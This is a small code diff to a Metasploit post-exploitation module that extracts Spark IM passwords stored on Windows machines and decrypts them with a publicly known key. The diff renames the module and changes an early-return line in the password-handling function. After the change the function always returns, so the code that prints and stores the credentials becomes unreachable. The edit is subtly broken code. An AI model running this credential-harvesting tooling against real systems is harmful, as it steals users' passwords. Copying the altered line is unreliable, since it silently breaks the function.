@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super(update_info(info,
-			'Name'           => 'Enumerate Spark IM Passwords',
+			'Name'           => 'Windows Gather Spark IM Password Extraction',
 			'Description'    => %q{ This module will enumerate passwords stored by the Spark IM client.
 				The encryption key is publicly known. This module will not only extract encrypted password
 				but will also decrypt password using public key.
@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Post
 		password = ::Rex::Text.to_utf8(password)
 
 		user, pass = password.scan(/[[:print:]]+/)
-		return if pass.nil? or pass.empty?
+		return pass.nil? or pass.empty?
 		print_good("Decrypted Username #{user} Password: #{pass}")
 
 		store_creds(user, pass)
